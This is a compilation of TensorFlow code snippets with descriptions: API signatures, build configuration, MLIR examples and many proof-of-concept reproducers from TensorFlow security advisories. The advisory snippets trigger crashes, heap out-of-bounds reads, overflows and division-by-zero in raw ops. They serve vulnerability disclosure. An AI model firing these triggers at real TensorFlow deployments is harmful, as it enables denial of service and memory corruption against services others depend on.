Out[2]: <tf.Tensor: shape=(1,), dtype=string, numpy=array([' +1234'],
dtype=object)>
In [3]: tf.strings.as_string(input=[1234], width=6, fill="h")
Out[3]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['%6d'],
dtype=object)>
In [4]: tf.strings.as_string(input=[1234], width=6, fill="d")
Out[4]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['12346d'],
dtype=object)>
In [5]: tf.strings.as_string(input=[1234], width=6, fill="o")
Out[5]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['23226d'],
dtype=object)>
In [6]: tf.strings.as_string(input=[1234], width=6, fill="x")
Out[6]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['4d26d'],
dtype=object)>
In [7]: tf.strings.as_string(input=[1234], width=6, fill="g")
Out[7]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['8.67458e-3116d'],
dtype=object)>
In [8]: tf.strings.as_string(input=[1234], width=6, fill="a")
Out[8]: <tf.Tensor: shape=(1,), dtype=string,
numpy=array(['0x0.00ff7eebb4d4p-10226d'], dtype=object)>
In [9]: tf.strings.as_string(input=[1234], width=6, fill="c")
Out[9]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['\xd26d'],
dtype=object)>
In [10]: tf.strings.as_string(input=[1234], width=6, fill="p")
Out[10]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['0x4d26d'],
dtype=object)>
In [11]: tf.strings.as_string(input=[1234], width=6, fill='m')
Out[11]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['Success6d'],
dtype=object)>
```

----------------------------------------

TITLE: Triggering SparseFillEmptyRowsGrad Vulnerability Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-160 vulnerability in TensorFlow's `SparseFillEmptyRowsGrad` operation. It calls the raw operation with empty lists for the required inputs, `reverse_index_map` and `grad_values`. Executing this code on a vulnerable TensorFlow version will cause the program to crash due to a failed internal `CHECK` condition, illustrating a denial-of-service vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-160.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.SparseFillEmptyRowsGrad(
    reverse_index_map=[], grad_values=[], name=None
)
```

----------------------------------------

TITLE: Triggering Heap Buffer Overflow using tf.raw_ops.StringNGrams Python
DESCRIPTION: This Python code demonstrates how to trigger the heap buffer overflow vulnerability in `tf.raw_ops.StringNGrams`. It constructs specific `data` and `data_splits` tensors along with padding and width parameters designed to cause the C++ kernel's `num_tokens` calculation to result in zero for certain ngrams, leading to an out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-029.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

separator = b'\x02\x00'
ngram_widths = [7, 6, 11]
left_pad = b'\x7f\x7f\x7f\x7f\x7f'
right_pad = b'\x7f\x7f\x25\x5d\x53\x74'
pad_width = 50
preserve_short_sequences = True

l = ['', '', '', '', '', '', '', '', '', '', '']

data = tf.constant(l, shape=[11], dtype=tf.string)

l2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 3]
data_splits = tf.constant(l2, shape=[116], dtype=tf.int64)

out = tf.raw_ops.StringNGrams(data=data,
    data_splits=data_splits, separator=separator,
    ngram_widths=ngram_widths, left_pad=left_pad,
    right_pad=right_pad, pad_width=pad_width,
    preserve_short_sequences=preserve_short_sequences)
```

----------------------------------------

TITLE: Invoking TensorFlow FakeQuantWithMinMaxVars with Non-Scalar Tensors (Python)
DESCRIPTION: This Python snippet demonstrates a vulnerability in the TensorFlow `FakeQuantWithMinMaxVars` operation (CVE-2022-35971). It shows how providing `min` and `max` tensors with a non-zero rank (shape `[2,3]`) causes a `CHECK` fail in vulnerable TensorFlow versions, leading to a denial of service. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-103.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

num_bits = 8
narrow_range = False
inputs = tf.constant(0, shape=[2,3], dtype=tf.float32)
min = tf.constant(0, shape=[2,3], dtype=tf.float32)
max = tf.constant(0, shape=[2,3], dtype=tf.float32)
tf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)
```

----------------------------------------

TITLE: Accessing Root ProcessUnit Buffer (Deprecated) Python
DESCRIPTION: A deprecated class method for accessing the root `ProcessUnit` object from a FlatBuffers buffer. Users are advised to switch to the `GetRootAs` method instead. It takes the buffer and an optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsProcessUnit(
    buf, offset=0
)
```

----------------------------------------

TITLE: Demonstrating FusedBatchNormGrad Heap OOB Vulnerability in TensorFlow (Python)
DESCRIPTION: This Python snippet acts as a proof-of-concept for the heap out-of-bounds vulnerability (TFSA-2021-169) in TensorFlow's `FusedBatchNormGrad` operation. It calls the raw operation with specifically crafted tensor shapes (`x` shape (1,1,1,2) with `y_backprop` (1,1,3,3)) and parameters that trigger the OOB read in the affected versions. Requires TensorFlow to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-169.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.FusedBatchNormGrad(
  y_backprop=tf.constant([i for i in range(9)],shape=(1,1,3,3),dtype=tf.float32)
  x=tf.constant([i for i in range(2)],shape=(1,1,1,2),dtype=tf.float32)
  scale=[1,1],
  reserve_space_1=[1,1],
  reserve_space_2=[1,1,1],
  epsilon=1.0,
  data_format='NCHW',
  is_training=True)
```

----------------------------------------

TITLE: Triggering FractionalAvgPoolGrad Overflow CHECK Failure in TensorFlow
DESCRIPTION: This Python code snippet demonstrates the TFSA-2022-095 vulnerability. It calls `tf.raw_ops.FractionalAvgPoolGrad` with a specifically crafted negative value for `orig_input_tensor_shape` (-1879048192), which triggers an integer overflow during internal validation, leading to a `CHECK` failure and denial of service in vulnerable TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-095.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

overlapping = True
orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)
out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)
row_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
col_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
tf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

----------------------------------------

TITLE: Processing Inputs in SparseMatrixSparseCholesky Kernel (C++)
DESCRIPTION: This C++ snippet shows the start of the `Compute` function for the `SparseMatrixSparseCholesky` kernel. It demonstrates how the permutation input is retrieved and the `ValidateInputs` function is called as part of the operation's execution flow, highlighting the point where validation is attempted.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-018.md#_snippet_1

LANGUAGE: C++
CODE:
```
void Compute(OpKernelContext* ctx) final {
  ...
  const Tensor& input_permutation_indices = ctx->input(1);
  ...
  ValidateInputs(ctx, *input_matrix, input_permutation_indices, &batch_size, &num_rows);
  ...
}
```

----------------------------------------

TITLE: Getting Max Values Length in Python
DESCRIPTION: This instance method returns the number of maximum values stored in the statistical data. It indicates the size of the list or array containing the max values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_6

LANGUAGE: Python
CODE:
```
MaxLength()
```

----------------------------------------

TITLE: Comparing NLClassifierOptions - TFLite Support - Python
DESCRIPTION: Implements the equality comparison method (`__eq__`) for the `NLClassifierOptions` class. It takes another object (`other`) as input and likely compares relevant attributes to determine if the two option objects are equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifierOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Comparing CategoricalSlot Objects in Python
DESCRIPTION: This snippet shows the method signature for the `__eq__` method of the `CategoricalSlot` class. It is used to check if the current object is equal to another object (`other`), returning a boolean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/CategoricalSlot.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Defining __eq__ Method (Python)
DESCRIPTION: This snippet shows the signature for the `__eq__` method of the `Tree` class. This method is used to determine if two `Tree` objects are equal, taking another object (`other`) as input for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Tree.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Make Bazel Executable (X86) - Shell
DESCRIPTION: Changes the permissions of the downloaded Bazelisk executable (`/usr/local/bin/bazel`) to make it executable using `chmod +x`. This is required before the system can run the downloaded binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_22

LANGUAGE: Shell
CODE:
```
chmod +x /usr/local/bin/bazel
```

----------------------------------------

TITLE: Rewriting Replicated Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows the result of applying the `-tf-tpu-rewrite` pass to a replicated `tf_device.cluster_func`. The compilation (`tf._TPUCompileMlir`, `tf.TPUCompileSucceededAssert`) happens on the CPU, and the execution (`tf.TPUExecute`) happens on replicated TPU cores, all orchestrated within the `tf_device.replicate` and `tf_device.launch` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_66

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<i8>, %arg1: tensor<i8>) {
  %0:2 = tf_device.replicate([%arg0, %arg1] as %arg2: tensor<i8>) {devices = {TPU_REPLICATED_CORE_0 = ["/job:worker/replica:0/task:0/device:TPU:0", "/job:worker/replica:0/task:0/device:TPU:1"], TPU_REPLICATED_HOST_0 = ["/job:worker/replica:0/task:0/device:CPU:0", "/job:worker:0/task:0/device:CPU:0"]}, n = 2 : i32} {
    %1:2 = "tf_device.launch"() ( {
      %compilation_status, %program = "tf._TPUCompileMlir"() {mlir_module = "<serialized func>"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
      tf_device.return %compilation_status, %program : tensor<!tf_type.string>, tensor<3x!tf_type.string>
    }) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
    "tf_device.launch"() ( {
      "tf.TPUCompileSucceededAssert"(%1#0) : (tensor<!tf_type.string>) -> ()
      tf_device.return
    }) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> ()
    %2 = "tf_device.launch"() ( {
      %3 = "tf.TPUExecute"(%arg2, %1#1) : (tensor<i8>, tensor<3x!tf_type.string>) -> tensor<i8>
      tf_device.return %3 : tensor<i8>
    }) {device = "TPU_REPLICATED_CORE_0"} : () -> tensor<i8>
    tf_device.return %2 : tensor<i8>
  }
  return
}
```

----------------------------------------

TITLE: Adding Public Tablegen Target for MHLO Passes (CMake)
DESCRIPTION: Defines a public CMake target named MLIRMhloPassIncGen for the generated MHLO pass includes. This target ensures that the tablegen output is generated before dependent libraries are compiled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(MLIRMhloPassIncGen)
```

----------------------------------------

TITLE: Manually Download TensorFlow Models Bash
DESCRIPTION: This bash script downloads the required TensorFlow model zip files (Inception, SSD-Mobilenet, Stylize) and extracts them into the project's `assets` directory. This is an optional step if you prefer not to rely on the automatic model download during the build process via Bazel or Gradle. After manually downloading, you must remove the corresponding entries in the build configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/test/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
BASE_URL=https://storage.googleapis.com/download.tensorflow.org/models
do
  for MODEL_ZIP in inception5h.zip ssd_mobilenet_v1_android_export.zip stylize_v1.zip
do
    curl -L ${BASE_URL}/${MODEL_ZIP} -o /tmp/${MODEL_ZIP}
    unzip /tmp/${MODEL_ZIP} -d tensorflow/tools/android/test/assets/
done
done
```

----------------------------------------

TITLE: Setting Fetch Content License Check Policy
DESCRIPTION: Sets the CMake variable `OVERRIDABLE_FETCH_CONTENT_LICENSE_CHECK` to `ON`. This is likely related to how CMake's FetchContent module handles license checks for downloaded dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_12

LANGUAGE: CMake
CODE:
```
# Make sure all repos have licenses.
set(OVERRIDABLE_FETCH_CONTENT_LICENSE_CHECK ON)
```

----------------------------------------

TITLE: Setting Base TFLite Compilation Options CMake
DESCRIPTION: Initializes CMake variables for public and private compiler options and private definitions used during the TensorFlow Lite compilation process. `TFLITE_TARGET_PUBLIC_OPTIONS` is set to a default value for Eigen.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_17

LANGUAGE: CMake
CODE:
```
set(TFLITE_TARGET_PUBLIC_OPTIONS "-DEIGEN_NEON_GEBP_NR=4")
set(TFLITE_TARGET_PRIVATE_OPTIONS "")
set(TFLITE_TARGET_PRIVATE_DEFINITIONS "")
```

----------------------------------------

TITLE: Invoking import_numpy Function Python
DESCRIPTION: This snippet shows the basic syntax for calling the `import_numpy` function within the `tflite_support.metadata_schema_py_generated` module. This function attempts to import the NumPy library and returns the module object if successful, or `None` otherwise. It requires the TensorFlow Lite Support library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/import_numpy.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.import_numpy()
```

----------------------------------------

TITLE: Initializing CUDA/CUDNN Repositories from Custom JSON Files (Bazel)
DESCRIPTION: This Bazel WORKSPACE snippet shows how to override the default CUDA/CUDNN JSON file locations using the `cuda_json_init_repository` rule. It uses Bazel dictionaries (`_CUDA_JSON_DICT`, `_CUDNN_JSON_DICT`) to map version strings to lists of JSON file paths, which can be local (`file:///`) or remote (`https://`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_8

LANGUAGE: Bazel
CODE:
```
_CUDA_JSON_DICT = {
   "12.4.0": [
      "file:///home/user/Downloads/redistrib_12.4.0_updated.json",
   ],
}

_CUDNN_JSON_DICT = {
   "9.0.0": [
      "https://developer.download.nvidia.com/compute/cudnn/redist/redistrib_9.0.0.json",
   ],
}

cuda_json_init_repository(
   cuda_json_dict = _CUDA_JSON_DICT,
   cudnn_json_dict = _CUDNN_JSON_DICT,
)
```

----------------------------------------

TITLE: Setting Bazel Test Flags for GPU (prior v2.18) - Bash
DESCRIPTION: Configures the environment and `flags` variable for running Bazel tests on GPU for TensorFlow versions prior to 2.18. It prepends necessary CUDA library paths to `LD_LIBRARY_PATH` and sets flags including `--config=linux`, `--config=cuda`, and `-k`. These steps are required to ensure the CUDA runtime can be found.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_9

LANGUAGE: bash
CODE:
```
export LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:/usr/local/cuda/lib64:/usr/local/cuda/extras/CUPTI/lib64:$LD_LIBRARY_PATH"
export flags="--config=linux --config=cuda -k"
```

----------------------------------------

TITLE: Applying Windows Specific Compilation Settings CMake
DESCRIPTION: Configures compilation settings specifically for the Windows operating system. It adds definitions `NOMINMAX`, `NOGDI`, and `TFLITE_MMAP_DISABLED` to the private options. It also includes logic for MSVC and GCC compilers regarding large object files (/bigobj or -Wa,-mbig-obj).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_19

LANGUAGE: CMake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Windows")
  # Use NOMINMAX to disable the min / max macros in windows.h as they break
  # use of std::min std::max.
  # Use NOGDI to ERROR macro which breaks TensorFlow logging.
  # Disable mmap, which is not available on Windows.
  list(APPEND TFLITE_TARGET_PRIVATE_OPTIONS "-DNOMINMAX" "-DNOGDI" "-DTFLITE_MMAP_DISABLED")
  # lite/kernels/conv.cc has more than 64k sections so enable /bigobj to
  # support compilation with MSVC2015.
  if(MSVC)
    list(APPEND TFLITE_TARGET_PRIVATE_OPTIONS "/bigobj")
    if(CMAKE_SIZEOF_VOID_P EQUAL 4)
      message("Disabling MSVC /O2 optimization for Win32")
      set(CompFlags
        CMAKE_CXX_FLAGS_RELEASE
        CMAKE_CXX_FLAGS_MINSIZEREL
        CMAKE_CXX_FLAGS_RELWITHDEBINFO
        CMAKE_C_FLAGS_RELEASE
        CMAKE_C_FLAGS_MINSIZEREL
        CMAKE_C_FLAGS_RELWITHDEBINFO
      )
      foreach (CompFlag ${CompFlags})
        string(REGEX REPLACE "(\/Ob. )" "" ${CompFlag} "${${CompFlag}}")
        string(REPLACE "/O2" "/O1" ${CompFlag} "${${CompFlag}}")
        list(REMOVE_DUPLICATES ${CompFlag})
        set(${CompFlag} "${${CompFlag}}" CACHE INTERNAL "")
      endforeach()
    endif()
    list(APPEND TFLITE_TARGET_PRIVATE_DEFINITIONS "_USE_MATH_DEFINES")
  elseif(CMAKE_COMPILER_IS_GNUCXX)
    list(APPEND TFLITE_TARGET_PRIVATE_OPTIONS "-Wa,-mbig-obj")
  endif()
endif()
```

----------------------------------------

TITLE: Comparing TFLite Model File Sizes
DESCRIPTION: Executes shell commands to display the human-readable file sizes of both the original floating-point TFLite model ('jax_mnist.tflite') and the quantized TFLite model ('jax_mnist_quant.tflite') using the `du -h` command.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_13

LANGUAGE: Python
CODE:
```
!du -h jax_mnist.tflite
!du -h jax_mnist_quant.tflite
```

----------------------------------------

TITLE: Vulnerable Code Location in SparseSplit - C++
DESCRIPTION: Highlights the specific lines in the TensorFlow C++ source code (`tensorflow/core/util/sparse/sparse_tensor.h`) responsible for the heap buffer overflow vulnerability in `SparseSplit`. The flaw occurs when accessing an array element based on the user-controlled `split_dim`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-046.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const int dim = input_tensor.indices().matrix<int64>()(i, split_dim);
int slice_index = GetSliceIndex(dim, split_size, residual);
num_values[slice_index]++;
```

----------------------------------------

TITLE: Initializing from Buffer (Python)
DESCRIPTION: Initializes the `ScoreCalibrationOptionsT` object from a buffer at a specific position. This class method is used for deserializing data from a flatbuffer buffer. Requires the buffer (`buf`) containing the data and the starting position (`pos`) within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Example Cosine Similarity Result
DESCRIPTION: This shows a sample output of the cosine similarity calculation between two image feature vectors, illustrating the expected format of the result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_embedder.md#_snippet_3

LANGUAGE: text
CODE:
```
Cosine similarity: 0.954312
```

----------------------------------------

TITLE: Reproducing FPE in TensorListSplit with XLA (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the Floating Point Exception (FPE) vulnerability in TensorFlow's `tf.raw_ops.TensorListSplit`. It uses specific input parameters and enables JIT compilation via `@tf.function(jit_compile=True)` to expose the flaw. Running this code is expected to cause a crash or error related to FPE.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-013.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.TensorListSplit
para = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

----------------------------------------

TITLE: Generate Documentation using Jazzy - Shell
DESCRIPTION: This shell command executes the Jazzy tool to generate API documentation for the TensorFlowLiteSwift module. It configures Jazzy to use 'xcodebuild' for the Swift build process, specifies the target module, attributes the documentation to the TensorFlow Authors, and sets the SDK to 'iphoneos'. This command is typically run from the command line in an environment where Jazzy is installed and the TensorFlowLiteSwift source code is accessible.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/docsgen/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
jazzy \
  --swift-build-tool xcodebuild \
  --module "TensorFlowLiteSwift" \
  --author "The TensorFlow Authors" \
  --sdk iphoneos \
```

----------------------------------------

TITLE: Defining Dot Operation in MLIR HLO
DESCRIPTION: Defines an XLA Dot operation between two floating-point parameters (`p0` and `p1`) with batch and contracting dimensions specified. It performs a batched matrix multiplication.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_5

LANGUAGE: MLIR HLO
CODE:
```
p0 = f32[4, 128, 256] parameter(0)
p1 = f32[4, 256, 64] parameter(1)
output = f32[4, 128, 64] dot(p0, p1),
  lhs_batch_dims={0}, rhs_batch_dims={0},
  lhs_contracting_dims={2}, rhs_contracting_dims={1}
```

----------------------------------------

TITLE: Starting AssociatedFile Definition using FlatBuffers Builder in Python
DESCRIPTION: This function initiates the process of building an `AssociatedFile` table using a FlatBuffers builder. It prepares the builder state to add subsequent fields related to the associated file, such as its name, type, and descriptive properties. It requires an initialized FlatBuffers builder instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileStart(
    builder
)
```

----------------------------------------

TITLE: Starting SentencePiece Tokenizer Vocab Vector in TFLite Support Python API
DESCRIPTION: This function is part of the `tflite_support.metadata_schema_py_generated` module, used for creating FlatBuffer metadata. It initiates the process of building a vector (list) to hold references to vocabulary files within the metadata structure for SentencePiece tokenizer options. It requires a FlatBuffer builder object (`builder`) and the total number of elements (`numElems`) that will be added to the vector, preparing the builder for serialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsStartVocabFileVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsStartVocabFileVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Proof of Concept for TensorFlow Broadcasting Vulnerability (Python)
DESCRIPTION: This Python code provides a proof-of-concept showing how the vulnerability can be exploited in TensorFlow, specifically using the `tf.broadcast_to` operation. It involves creating a small TensorFlow constant and attempting to broadcast it to a large shape generated from a numpy array, likely hitting the vulnerable `ndarray_tensor_bridge` path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-146.md#_snippet_1

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

input_val = tf.constant([1])
shape_val = np.array([i for i in range(21)])

tf.broadcast_to(input=input_val,shape=shape_val)
```

----------------------------------------

TITLE: Triggering RequantizationRange Vulnerability - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the heap out-of-bounds read vulnerability in `tf.raw_ops.RequantizationRange`. It creates empty tensors for `input_min` and `input_max`, which the underlying C++ kernel fails to handle correctly, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-058.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant([1], shape=[1], dtype=tf.qint32)
input_max = tf.constant([], dtype=tf.float32)
input_min = tf.constant([], dtype=tf.float32)

tf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)
```

----------------------------------------

TITLE: Triggering TFLite Null Pointer Vulnerability Python
DESCRIPTION: This Python script constructs a minimal Keras model, converts it into a TensorFlow Lite model, and attempts to run it using the TFLite interpreter. The specific architecture (Dense layer with 0 units) is crafted to expose a null pointer dereference vulnerability during interpretation, leading to a crash. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-162.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

model = tf.keras.models.Sequential()
model.add(tf.keras.Input(shape=(1, 2, 3)))
model.add(tf.keras.layers.Dense(0, activation='relu'))

converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

interpreter.invoke()
```

----------------------------------------

TITLE: Demonstrating tf.reshape Overflow Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-085 vulnerability in TensorFlow's `tf.reshape`. It attempts to reshape a tensor into a large shape array (255 zeros) which causes an integer overflow when calculating the total number of elements, leading to a `CHECK` failure and denial of service. Requires the TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-085.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.reshape(tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64))
```

----------------------------------------

TITLE: Triggering QuantizedMul Division by Zero Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the division by zero vulnerability (CVE-2021-29528) in `tf.raw_ops.QuantizedMul`. By providing an empty tensor `y`, the underlying C++ kernel attempts to perform a modulo operation with a divisor of zero, resulting in an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-017.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.zeros([4, 1], dtype=tf.quint8)
y = tf.constant([], dtype=tf.quint8)
min_x = tf.constant(0.0)
max_x = tf.constant(0.0010000000474974513)
min_y = tf.constant(0.0)
max_y = tf.constant(0.0010000000474974513)

tf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

----------------------------------------

TITLE: Demonstrating Heap Buffer Overflow in TensorFlow AvgPool3DGrad (Python)
DESCRIPTION: This Python code snippet demonstrates the heap buffer overflow vulnerability in `tf.raw_ops.AvgPool3DGrad`. It sets up input tensors with specific, incompatible shapes (`orig_input_shape` and `grad`) that exploit an unchecked assumption in the underlying C++ kernel implementation, leading to the overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-065.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.AvgPool3DGrad(
  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,
  padding=padding)
```

----------------------------------------

TITLE: Triggering Conv3DBackpropInputV2 Vulnerability in Python
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in the `tf.raw_ops.Conv3DBackpropInputV2` operation by providing empty or zero-sized tensors for input_sizes, filter, and out_backprop. Executing this code in affected TensorFlow versions will likely result in a runtime error due to division by zero within the kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-011.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)
out_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Demonstrating Vulnerability: SqrtGrad with Mismatched Inputs (Python)
